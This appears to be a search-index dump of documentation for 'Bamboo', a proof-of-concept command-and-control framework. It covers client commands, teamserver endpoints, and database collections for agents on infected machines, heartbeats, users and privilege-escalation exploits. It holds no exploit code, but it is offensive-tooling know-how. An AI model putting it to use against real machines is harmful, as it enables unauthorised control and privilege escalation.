<code>exploits</code>","text":"<p>The exploits class provides method for interacting with the exploits loaded in the database through various server endpoints. This includes processes such as add an exploit, modifying an exploit, and more.</p> <p></p>"},{"location":"Client/Command_Classes/command_exploit.html#view_exploits","title":"view_exploits","text":"<p>Retrieves and displays a list of all current exploits.</p>"},{"location":"Client/Command_Classes/command_exploit.html#endpoint","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/view_all\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#description","title":"Description","text":"<p>This function sends a POST request to retrieve all exploits from the server and displays them in a formatted table.</p>"},{"location":"Client/Command_Classes/command_exploit.html#function-argument","title":"Function Argument","text":"Field Type Description username String Username of the user jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_exploit.html#arguments-example","title":"Arguments Example","text":"Text Only<pre><code>view_exploits(\"bambooUser\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#function-return","title":"Function Return","text":"Field Type Description headers List Headers for the table table List List of exploit details for the table"},{"location":"Client/Command_Classes/command_exploit.html#add_exploit","title":"add_exploit","text":"<p>Adds a new exploit to the server.</p>"},{"location":"Client/Command_Classes/command_exploit.html#endpoint_1","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/add\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#description_1","title":"Description","text":"<p>This function handles the process of adding a new exploit, including collecting file information and configurations from the user. When configuring the new exploit to add, different options will be shown depending on the previous output as the whole process is dynamic and will only query for an input if there was a choice.</p>"},{"location":"Client/Command_Classes/command_exploit.html#function-argument_1","title":"Function Argument","text":"Field Type Description username String Username of the user jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_exploit.html#arguments-example_1","title":"Arguments Example","text":"Text Only<pre><code>add_exploit(\"bambooUser\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#function-return_1","title":"Function Return","text":"Field Type Description Status String Success or failure message"},{"location":"Client/Command_Classes/command_exploit.html#del_exploit","title":"del_exploit","text":"<p>Deletes an existing exploit from the server.</p>"},{"location":"Client/Command_Classes/command_exploit.html#endpoint_2","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/delete\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#description_2","title":"Description","text":"<p>This function sends a request to delete an exploit based on its name.</p>"},{"location":"Client/Command_Classes/command_exploit.html#function-argument_2","title":"Function Argument","text":"Field Type Description username String Username of the user exploit_name String Name of the exploit to delete jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_exploit.html#arguments-example_2","title":"Arguments Example","text":"Text Only<pre><code>del_exploit(\"bambooUser\", \"wacom.exe\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#function-return_2","title":"Function Return","text":"Field Type Description Status String Success or failure message"},{"location":"Client/Command_Classes/command_exploit.html#modify","title":"modify","text":"<p>Modifies the details of an existing exploit.</p>"},{"location":"Client/Command_Classes/command_exploit.html#endpoint_3","title":"Endpoint","text":"Text Only<pre><code>POST /exploit/modify\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#description_3","title":"Description","text":"<p>This function allows for modification of an existing exploit. It includes options to change various details such as name, app version, LPE start, LPE end, and others. Some changes will result in other changes as well. Refer to the flowchart below to find out more.</p> <p>&lt;add exploit flowchart&gt;</p>"},{"location":"Client/Command_Classes/command_exploit.html#function-argument_3","title":"Function Argument","text":"Field Type Description username String Username of the user exploit_name String Name of the exploit to delete jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_exploit.html#arguments-example_3","title":"Arguments Example","text":"Text Only<pre><code>modify(\"bambooUser\", \"wacom.exe\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_exploit.html#function-return_3","title":"Function Return","text":"Field Type Description Status String Success or failure message"},{"location":"Client/Command_Classes/command_handler_func.html","title":"Command Class - <code>handler_func</code>","text":"<p>The handler_func class provides methods that are handy for the user but are not related to commands, exploits, and authorization. This includes processes such as displaying all agents, displaying all users, and more.</p> <p></p>"},{"location":"Client/Command_Classes/command_handler_func.html#display","title":"display","text":"<p>Retrieves information from the database</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/agent/display\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description","title":"Description","text":"<p>This function sends a POST request to retrieve agent and heartbeat status data from the server. It then formats and displays this data in a table with color-coded statuses.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument","title":"Function Argument","text":"Field Type Description username String Username of the user jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example","title":"Arguments Example","text":"Text Only<pre><code>display(\"bambooUser\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return","title":"Function Return","text":"Field Type Description table List List containing headers and table data"},{"location":"Client/Command_Classes/command_handler_func.html#use_agent","title":"use_agent","text":"<p>Obtains agent information and caches it for future use.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_1","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/use_agent\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_1","title":"Description","text":"<p>This function requests agent data using its identifier and caches the data for future use. It also handles cases where the agent does not exist.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_1","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_1","title":"Arguments Example","text":"Text Only<pre><code>use_agent(\"bambooUser\", \"5zrire9a\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_1","title":"Function Return","text":"Field Type Description agent_data Dict Dictionary containing agent information or empty"},{"location":"Client/Command_Classes/command_handler_func.html#stop_agent","title":"stop_agent","text":"<p>Clears the cache and stops using the specified agent.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_2","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/stop_agent\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_2","title":"Description","text":"<p>This function sends a request to stop using a specified agent and clears any cached data related to that agent.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_2","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_2","title":"Arguments Example","text":"Text Only<pre><code>stop_agent(\"bambooUser\", \"5zrire9a\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_2","title":"Function Return","text":"Field Type Description Status String Status of the stop operation"},{"location":"Client/Command_Classes/command_handler_func.html#remove_agent","title":"remove_agent","text":"<p>Removes an agent from the database.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_3","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/remove_agent\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_3","title":"Description","text":"<p>This function sends a request to remove an agent from the database and handles success or failure responses. If the agent is still running, it will sent server will send a kill command to stop the agent from running.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_3","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_3","title":"Arguments Example","text":"Text Only<pre><code>remove_agent(\"bambooUser\", \"5zrire9a\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_3","title":"Function Return","text":"Field Type Description Status String Status of the stop operation"},{"location":"Client/Command_Classes/command_handler_func.html#info_status","title":"info_status","text":"<p>Checks the status of a specific agent.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_4","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/info_status\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_4","title":"Description","text":"<p>This function checks the status of a specified agent by sending a request to the server.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_4","title":"Function Argument","text":"Field Type Description username String Username of the user agent_identifier String Identifier of the agent jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_4","title":"Arguments Example","text":"Text Only<pre><code>info_status(\"bambooUser\", \"5zrire9a\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_4","title":"Function Return","text":"Field Type Description Status String Status of the agent"},{"location":"Client/Command_Classes/command_handler_func.html#view_users","title":"view_users","text":"<p>Views and displays all users in the database.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_5","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/view_users\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_5","title":"Description","text":"<p>This function retrieves and displays user information from the database, showing their status as well.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_5","title":"Function Argument","text":"Field Type Description username String Username of the user jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_5","title":"Arguments Example","text":"Text Only<pre><code>view_users(\"bambooUser\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_5","title":"Function Return","text":"Field Type Description Table List List containing headers and user data"},{"location":"Client/Command_Classes/command_handler_func.html#register_user","title":"register_user","text":"<p>Registers a new user in the database.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_6","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/register_user\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_6","title":"Description","text":"<p>This function sends a request to register a new user and handles responses based on the result of the registration attempt.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_6","title":"Function Argument","text":"Field Type Description username String Username of the user new_username String Username of the new user new_password String Password of the new user jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_6","title":"Arguments Example","text":"Text Only<pre><code>register_user(\"bambooUser\", \"bambooUserTwo\", \"paSswORd@111\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_6","title":"Function Return","text":"Field Type Description Status String Status of the registration"},{"location":"Client/Command_Classes/command_handler_func.html#delete_user","title":"delete_user","text":"<p>Deletes a user from the database.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#endpoint_7","title":"Endpoint","text":"Text Only<pre><code>POST /handler_func/handler/delete_user\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#description_7","title":"Description","text":"<p>This function sends a request to delete a specified user from the database.</p>"},{"location":"Client/Command_Classes/command_handler_func.html#function-argument_7","title":"Function Argument","text":"Field Type Description username String Username of the user del_username String Username of the user to delete jwt_token String JSON Web Token for authentication"},{"location":"Client/Command_Classes/command_handler_func.html#arguments-example_7","title":"Arguments Example","text":"Text Only<pre><code>delete_user(\"bambooUser\", \"bambooUserTwo\", jwt_token)\n</code></pre>"},{"location":"Client/Command_Classes/command_handler_func.html#function-return_7","title":"Function Return","text":"Field Type Description Status String Status of the deletion operation"},{"location":"Database/collections.html","title":"Collections","text":""},{"location":"Database/collections.html#database","title":"Database","text":"<p>Bamboo Teamserver uses MongoDB as its database. MongoDB is an unstructured database that stores data in JSON format, which is what Bamboo Client and Bamboo Agent can work easily with. </p> <p>Bamboo Teamserver database is called \"C2-Server\". There are a total of 4 collections, agents, exploits, heartbeats, and user. exploits and user collection should be imported before running while agents and heartbeats collection will be created when certain functions are called.</p>"},{"location":"Database/collections.html#collections_1","title":"Collections","text":"<p>Each collection within the Bamboo Teamserver\"s C2-Server database serves a specific purpose. Below is a detailed description of each collection and the types of data it stores.</p>"},{"location":"Database/collections.html#collection-agents","title":"Collection - agents","text":"<p>This collection will be created after the first Bamboo Agent is connected to Bamboo Teamserver. This collection stores all information of connected Bamboo Agents and can be displayed when using the {command <code>display</code>}.</p> Key Value Type Description Examples agent_identifier String Unique, 8 characters 5zrire9a hostname String Hostname of infected machine bambooComA publicIP String Public IP address of infected machine 132.99.121.23 privateIP String Private IP address of infected machine 172.168.11.69 priv_lvl String Agent starting privilege level (Low, Medium, High, System) Medium"},{"location":"Database/collections.html#example","title":"Example","text":"Text Only<pre><code>[\n    {\n        \"agent_identifier\": \"5zrire9a\",\n        \"hostname\": \"bambooComA\",\n        \"publicIP\": \"18.136.14.9\",\n        \"privateIP\": \"172.22.49.221\",\n        \"priv_lvl\": \"Medium\"\n    },\n    {\n    {\n        \"agent_identifier\": \"3tj0owfy\",\n        \"hostname\": \"bambooComB\",\n        \"publicIP\": \"198.250.6.31\",\n        \"privateIP\": \"192.168.68.102\",\n        \"priv_lvl\": \"System\"\n    }\n]\n</code></pre>"},{"location":"Database/collections.html#models-and-endpoints-related","title":"Models and Endpoints related","text":"<p>The table below shows the models and Endpoints which interacts with this collection.</p> Model Endpoint agents.add_agent /agent/initial_connection/register agents.show_agents /handler_func/agent/display agents.check_agent_identifier /agent/initial_connection/register agents.use_agent /hander_func/handler/use_agent agents.remove_agent /hander_func/handler/remove_agent"},{"location":"Database/collections.html#collection-exploits","title":"Collection - exploits","text":"<p>Bamboo offers multiple preloaded exploits and users should import the json file C2-Server.exploits.json for setting up.</p> Key Value Type Description Examples name String Name of exploit wacom.exe app_version String App name and version Wacom Tablet 6.3.45-1 LPE_start String Starting privilege (User/Admin) user LPE_end String Ending privilege (Admin/System) system uac_bypass Boolean If exploit requires uac_bypass false drop-to-disk Boolean If exploit can be drop-to-disk true inject Boolean If exploit can be injected true drop_file String If any dropping of files is required"},{"location":"Database/collections.html#example_1","title":"Example","text":"Text Only<pre><code>[\n    {\n        \"name\": \"filmora.exe\",\n        \"app_version\": \"Wondershare Filmora v11\",\n        \"LPE_start\": \"admin\",\n        \"LPE_end\": \"system\",\n        \"uac_bypass\": true,\n        \"drop-to-disk\": true,\n        \"inject\": true,\n        \"drop_file\": \"filmora.exe\"\n    },\n    {\n        \"name\": \"wacom.exe\",\n        \"app_version\": \"Wacom Tablet 6.3.45-1\",\n        \"LPE_start\": \"user\",\n        \"LPE_end\": \"system\",\n        \"uac_bypass\": false,\n        \"drop-to-disk\": true,\n        \"inject\": true,\n        \"drop_file\": \"\"\n    }\n]\n</code></pre>"},{"location":"Database/collections.html#models-and-endpoints-related_1","title":"Models and Endpoints related","text":"<p>The table below shows the models and Endpoints which interacts with this collection.</p> Model Endpoint exploits.view_all /exploits/view_all exploits.add_exploit /exploits/add exploits.del_exploit /exploits/delete exploits.find_one /exploits/exist exploits.modify /exploits/modify exploits.modify_gui /exploits/modify_gui"},{"location":"Database/collections.html#collection-heartbeats","title":"Collection - heartbeats","text":"<p>This collection is related to the agents collection. This contains all heartbeat related information of the agent. Bamboo Agents will send heartbeats to the Bamboo Teamserver in intervals to notify the server that it is still \"alive\" and running.</p> Key Value Type Description Examples agent_identifier String Unique, 8 characters 5zrire9a heartbeat Integer Next heartbeat in seconds 8 current_time Date Timestamp of current heartbeat 2024-07-08T17:00:36.778+00:00 expected_time Date Expected timestamp of next heartbeat 2024-07-08T17:00:44.778+00:00 status String Agent status alive"},{"location":"Database/collections.html#example_2","title":"Example","text":"Text Only<pre><code>[\n    {\n        \"agent_identifier\": \"5zrire9a\",\n        \"heartbeat\": 8,\n        \"current_time\": 2024-07-08T17:00:36.778+00:00,\n        \"expected_time\": 2024-07-08T17:00:44.778+00:00,\n        \"status\": \"alive\"\n    },\n    {\n        \"agent_identifier\": \"3tj0owfy\",\n        \"heartbeat\": 10,\n        \"current_time\": 2024-07-30T16:38:15.653+00:00\n        \"expected_time\": 2024-07-30T16:38:25.653+00:00,\n        \"status\": \"dead\"\n    }\n]\n</code></pre>"},{"location":"Database/collections.html#models-and-endpoints-related_2","title":"Models and Endpoints related","text":"<p>The table below shows the models and Endpoints which interacts with this collection.</p> Model Endpoint agents.add_heartbeat /agent/initial_connection/register, /agent/heartbeat agents.get_heartbeat /handler_func/agent/display agents.status_dead Automatic function in Bamboo Teamserver that cleans up Bamboo Agent in database agents.find_dead_but_alive Automatic function in Bamboo Teamserver that cleans up Bamboo Agent in database agents.remove_agent /hander_func/handler/remove_agent agents.info_status /handler_func/handler/info_status agents.remove_inactive Automatic function in Bamboo Teamserver that cleans up Bamboo Agent in database authentication.obtain_status /auth/check_agent_status"},{"location":"Database/collections.html#collection-users","title":"Collection - users","text":"<p>Bamboo comes with one default user. For users to log in after setting up, users should import the json file C2-Server.user.json for setting up. They can then register new users using the command register.</p> <p>As Bamboo is just a PoC, the password stored in the database will not be encrypted. Users can add in encryption for passwords using bcrypt. The file to edit will be /teamserver/api/authentication.py, under login to encrypt the password that the user entered to try to match, and /teamserver/api/handler_func.py, to upload encrypted password.</p> Key Value Type Description Examples username String Username of user bambooUser password String Password of user adnap status String If the user is online or offline online"},{"location":"Database/collections.html#example_3","title":"Example","text":"Text Only<pre><code>[\n    {\n        \"username\": \"bambooUser\",\n        \"password\": \"adnap\",\n        \"status\": \"online\"\n    },\n    {\n        \"username\": \"bambooUserTwo\",\n        \"password\": \"paSswORd@111\",\n        \"status\" \"offline\"\n    }\n]\n</code></pre>"},{"location":"Database/collections.html#models-and-endpoints-related_3","title":"Models and Endpoints related","text":"<p>The table below shows the models and Endpoints which interacts with this collection.</p> Model Endpoint users.view_users /handler_func/handler/view_users users.user_online /auth/login users.user_offline /auth/logout users.register_user /handler_func/handler/register_user users.delete_user /handler_func/handler/delete_user users.find_one /handler_func/handler/register_user auth.login_auth /auth/login"},{"location":"Database/model_agents.html","title":"Model agents","text":""},{"location":"Database/model_agents.html#model-class-agents","title":"Model Class - agents","text":"<p>This class contains all models related to Bamboo Agent. Bamboo Teamserver will make use of the functions within this class to find, update, add, and delete Bamboo Agents according to the needs of Bamboo Client. This class will be interacting with the <code>agents collection</code> and the <code>heartbeats collection</code></p>"},{"location":"Database/model_agents.html#add_agent","title":"add_agent","text":"<p>Add new Bamboo Agent information into the database</p>"},{"location":"Database/model_agents.html#usage","title":"Usage","text":"Text Only<pre><code>POST /agent/initial_connection/register\n</code></pre>"},{"location":"Database/model_agents.html#description","title":"Description","text":"<p>add_agent is used when a new Bamboo Agent is registered and Bamboo Teamserver wants to insert the new Bamboo Agent information into the <code>collection agents</code></p>"},{"location":"Database/model_agents.html#function-arguments","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent hostname String Hostname if infected machine publicIP String Public IP address of infected machine privateIP String Private IP address of infected machine priv_lvl String Privilege level of Bamboo Agent"},{"location":"Database/model_agents.html#arguments-example","title":"Arguments Example","text":"Text Only<pre><code>add_agent(\"5zrire9a\", \"bambooMachine\", \"39.100.49.231\", \"192.168.45.7\", \"medium\")\n</code></pre>"},{"location":"Database/model_agents.html#database-method","title":"Database Method","text":"Method Collection Return insert_one agents Null"},{"location":"Database/model_agents.html#insertion-example","title":"Insertion Example","text":"Text Only<pre><code>new_agent = {\n    \"agent_identifier\": \"5zrire9a\",\n    \"hostname\": \"bambooMachine\",\n    \"publicIP\": \"39.100.49.231\",\n    \"privateIP\": \"192.168.45.7\",\n    \"Integrity\": \"Medium\"\n}\n</code></pre>"},{"location":"Database/model_agents.html#function-return","title":"Function Return","text":"Type Description Dictionary Notify Bamboo Teamserver of status"},{"location":"Database/model_agents.html#return-example","title":"Return Example","text":"Text Only<pre><code>{\"status\": \"success\"}\n</code></pre>"},{"location":"Database/model_agents.html#show_agents","title":"show_agents","text":"<p>Retrieve all information of registered Bamboo Agent</p>"},{"location":"Database/model_agents.html#usage_1","title":"Usage","text":"Text Only<pre><code>POST /handler_func/agent/display\n</code></pre>"},{"location":"Database/model_agents.html#description_1","title":"Description","text":"<p>show_agents extracts all registered Bamboo Agent data from the <code>collection agents</code>. It will then loop through all the data and append them into a list, returning the list to Bamboo Teamserver.</p>"},{"location":"Database/model_agents.html#function-arguments_1","title":"Function Arguments","text":"<p>Does not require any arguments</p>"},{"location":"Database/model_agents.html#database-method_1","title":"Database Method","text":"Method Collection Return find agents List of data"},{"location":"Database/model_agents.html#function-return_1","title":"Function Return","text":"Type Description Nested List All Bamboo Agent data"},{"location":"Database/model_agents.html#return-example_1","title":"Return Example","text":"Text Only<pre><code>data = [\n    [\n        \"agent_identifier\": \"5zrire9a\",\n        \"hostname\": \"bambooMachine\",\n        \"publicIP\": \"39.100.49.231\",\n        \"privateIP\": \"192.168.45.7\",\n        \"Integrity\": \"Medium\"\n    ],\n    [\n        \"agent_identifier\": \"ysa903nq\",\n        \"hostname\": \"bambooMachine2\",\n        \"publicIP\": \"84.120.93.211\",\n        \"privateIP\": \"192.168.88.110\",\n        \"Integrity\": \"High\"\n    ]\n]\n</code></pre>"},{"location":"Database/model_agents.html#check_agent_identifier","title":"check_agent_identifier","text":"<p>Determines if Bamboo Agent specified exist in the database</p>"},{"location":"Database/model_agents.html#usage_2","title":"Usage","text":"Text Only<pre><code>POST /agent/initial_connection/register\n</code></pre>"},{"location":"Database/model_agents.html#description_2","title":"Description","text":"<p>check_agent_identifier attempts to find specified agent identifier in <code>collection agents</code>, and determines if it exist in the database</p>"},{"location":"Database/model_agents.html#function-arguments_2","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent"},{"location":"Database/model_agents.html#arguments-example_1","title":"Arguments Example","text":"Text Only<pre><code>check_agent_identifier(\"5zrire9a\")\n</code></pre>"},{"location":"Database/model_agents.html#database-method_2","title":"Database Method","text":"Method Collection Return find_one agents Boolean (True of exist)"},{"location":"Database/model_agents.html#function-return_2","title":"Function Return","text":"Type Description Boolean If specified Bamboo Agent exist"},{"location":"Database/model_agents.html#return-example_2","title":"Return Example","text":"Text Only<pre><code>True\n</code></pre>"},{"location":"Database/model_agents.html#add_heartbeat","title":"add_heartbeat","text":"<p>Add new Bamboo Agent heartbeat information into database</p>"},{"location":"Database/model_agents.html#usage_3","title":"Usage","text":"Text Only<pre><code>POST /agent/initial_connection/register\nPOST /agent/heartbeat\n</code></pre>"},{"location":"Database/model_agents.html#description_3","title":"Description","text":"<p>add_heartbeat will allows Bamboo Teamserver to keep track of all Bamboo Agent status. It will be called when a new Bamboo Agent is registered or existing registered Bamboo Agent send their heartbeat. Only <code>collection heartbeats</code> will be affected.</p> <p>The model will first attempt to find the Bamboo Agent using their agent identifier to determine if the Bamboo Agent is new by extracting data. It will be empty if the Bamboo Agent is new. If the Bamboo Agent is new, it will insert the data into the collection. If the Bamboo Agent already exist, it will determine if the Bamboo Agent heartbeat was \"late\" or not and update the existing information. It will return different values depending on it.</p>"},{"location":"Database/model_agents.html#function-arguments_3","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent heartbeat String Seconds before the next heartbeat current_time Date Current timestamp expected_time Date Expected timestamp to receive heartbeat (current_time + heartbeat) status String Update it to \"alive\""},{"location":"Database/model_agents.html#arguments-example_2","title":"Arguments Example","text":"Text Only<pre><code>add_heartbeat(\"5zrire9a\", \"6\", \"2024-07-30T16:38:15.653+00:00\", \"2024-07-30T16:38:21.653+00:00\", \"alive\")\n</code></pre>"},{"location":"Database/model_agents.html#database-method_3","title":"Database Method","text":"Method Collection Return Usage find heartbeats Data of Bamboo Agent. Empty if does not exist Determine if Bamboo Agent is new insert_one heartbeats Null Insert new Bamboo Agent information update_many heartbeats True for success, False for failed If Bamboo Agent heartbeat Bamboo Teamserver after expected_time update_many heartbeats True for success, False for failed Bamboo Agent heartbeat is punctual"},{"location":"Database/model_agents.html#insertion-example_1","title":"Insertion Example","text":"Text Only<pre><code>new_heartbeat = {\n    \"agent_identifier\": \"5zrire9a\",\n    \"heartbeat\": 6,\n    \"current_time\": \"2024-07-30T16:38:15.653+00:00\",\n    \"expected_time\": \"2024-07-30T16:38:21.653+00:00\",\n    \"status\": \"alive\"\n}\n</code></pre>"},{"location":"Database/model_agents.html#update-example","title":"Update Example","text":"Text Only<pre><code>{\"agent_identifier\": 5zrire9a}, \n{\"$set\": {\n    \"heartbeat\": 6, \n    \"current_time\": \"2024-07-30T16:38:15.653+00:00\", \n    \"expected_time\": \"2024-07-30T16:38:21.653+00:00\", \n    \"status\": \"alive\"\n    }\n}\n</code></pre>"},{"location":"Database/model_agents.html#function-return_3","title":"Function Return","text":"Type Description Dictionary Added new heartbeat Dictionary Updated heartbeat"},{"location":"Database/model_agents.html#function-example","title":"Function Example","text":"Text Only<pre><code>{\"agent\": \"new\"}\n</code></pre> Text Only<pre><code>{\"agent\": \"punctual\"}\n</code></pre>"},{"location":"Database/model_agents.html#get_heartbeat","title":"get_heartbeat","text":"<p>Retrieve Bamboo Agent status from heartbeats</p>"},{"location":"Database/model_agents.html#usage_4","title":"Usage","text":"Text Only<pre><code>POST /handler_func/agent/display\n</code></pre>"},{"location":"Database/model_agents.html#description_4","title":"Description","text":"<p>get_heartbeat objective is to extract the status of the Bamboo Agent to determine if they are \"dead\" or \"alive\" from the <code>collection heartbeats</code>. It will then loop through all the data and append only the status into a list, returning the list to Bamboo Teamserver.</p>"},{"location":"Database/model_agents.html#function-arguments_4","title":"Function Arguments","text":"<p>Does not require any arguments</p>"},{"location":"Database/model_agents.html#database-method_4","title":"Database Method","text":"Method Collection Return find heartbeats List status"},{"location":"Database/model_agents.html#function-return_4","title":"Function Return","text":"Type Description List Status of all Bamboo Agent in database"},{"location":"Database/model_agents.html#return-example_3","title":"Return Example","text":"Text Only<pre><code>data = [\n    \"dead\",\n    \"dead\",\n    \"alive\"\n]\n</code></pre>"},{"location":"Database/model_agents.html#status_dead","title":"status_dead","text":"<p>Update Bamboo Agent status to dead</p>"},{"location":"Database/model_agents.html#usage_5","title":"Usage","text":"Text Only<pre><code>Automatic function in Bamboo Teamserver that cleans up Bamboo Agent in database\n</code></pre>"},{"location":"Database/model_agents.html#description_5","title":"Description","text":"<p>status_dead will update the specified Bamboo Agent status to dead in the <code>collection heartbeats</code>.</p>"},{"location":"Database/model_agents.html#function-arguments_5","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent"},{"location":"Database/model_agents.html#arguments-example_3","title":"Arguments Example","text":"Text Only<pre><code>status_dead(\"5zrire9a\")\n</code></pre>"},{"location":"Database/model_agents.html#database-method_5","title":"Database Method","text":"Method Collection Return update_many heartbeats Status of update (boolean)"},{"location":"Database/model_agents.html#function-return_5","title":"Function Return","text":"Type Description Dictionary Status of update"},{"location":"Database/model_agents.html#return-example_4","title":"Return Example","text":"Text Only<pre><code>{\"status\": \"done\"}\n</code></pre>"},{"location":"Database/model_agents.html#find_dead_but_alive","title":"find_dead_but_alive","text":"<p>Extract all Bamboo Agent who are \"alive\"</p>"},{"location":"Database/model_agents.html#usage_6","title":"Usage","text":"Text Only<pre><code>Automatic function in Bamboo Teamserver that cleans up Bamboo Agent in database\n</code></pre>"},{"location":"Database/model_agents.html#description_6","title":"Description","text":"<p>find_dead_but_alive will retrieve all registered Bamboo Agent status which are \"alive\" in the <code>collection heartbeats</code>.</p>"},{"location":"Database/model_agents.html#function-arguments_6","title":"Function Arguments","text":"<p>Does not require any arguments</p>"},{"location":"Database/model_agents.html#database-method_6","title":"Database Method","text":"Method Collection Return find heartbeats List of agent identifier that match the criteria"},{"location":"Database/model_agents.html#function-return_6","title":"Function Return","text":"Type Description Dictionary Contains a list of agent identifier"},{"location":"Database/model_agents.html#return-example_5","title":"Return Example","text":"Text Only<pre><code>{\"alive_agents\": [\"5zrire9a\", \"62yb10jd\", \"p12ls3da\"]}\n</code></pre>"},{"location":"Database/model_agents.html#use_agent","title":"use_agent","text":"<p>Extract all information of specified Bamboo Agent</p>"},{"location":"Database/model_agents.html#usage_7","title":"Usage","text":"Text Only<pre><code>POST /hander_func/handler/use_agent\n</code></pre>"},{"location":"Database/model_agents.html#description_7","title":"Description","text":"<p>use_agent retrieve the information of the specified Bamboo Agent in <code>agents collection</code>.</p>"},{"location":"Database/model_agents.html#function-arguments_7","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent"},{"location":"Database/model_agents.html#arguments-example_4","title":"Arguments Example","text":"Text Only<pre><code>use_agent(\"5zrire9a\")\n</code></pre>"},{"location":"Database/model_agents.html#database-method_7","title":"Database Method","text":"Method Collection Return find_one agents List information of specified Bamboo agent (agent_data)"},{"location":"Database/model_agents.html#function-return_7","title":"Function Return","text":"Type Description Dictionary Contains a list agent information Dictionary None (no such agent)"},{"location":"Database/model_agents.html#return-example_6","title":"Return Example","text":"Text Only<pre><code>{\"agent_data\": [\n        \"agent_identifier\": \"5zrire9a\",\n        \"hostname\": \"bambooMachine\",\n        \"publicIP\": \"39.100.49.231\",\n        \"privateIP\": \"192.168.45.7\",\n        \"Integrity\": \"Medium\"\n    ]\n}\n</code></pre>"},{"location":"Database/model_agents.html#remove_agent","title":"remove_agent","text":"<p>Remove all information of specified Bamboo Agent</p>"},{"location":"Database/model_agents.html#usage_8","title":"Usage","text":"Text Only<pre><code>POST /hander_func/handler/remove_agent\n</code></pre>"},{"location":"Database/model_agents.html#description_8","title":"Description","text":"<p>remove_agent will completely remove the specified Bamboo Agent information, from both <code>collection agents and heartbeats</code>. It will first check if the specified Bamboo Agent exist first before deleting the data.</p>"},{"location":"Database/model_agents.html#function-arguments_8","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent"},{"location":"Database/model_agents.html#arguments-example_5","title":"Arguments Example","text":"Text Only<pre><code>remove_agent(\"5zrire9a\")\n</code></pre>"},{"location":"Database/model_agents.html#database-method_8","title":"Database Method","text":"Method Collection Return find_one agents Boolean value delete_many agents Boolean value delete_many heartbeats Boolean value"},{"location":"Database/model_agents.html#function-return_8","title":"Function 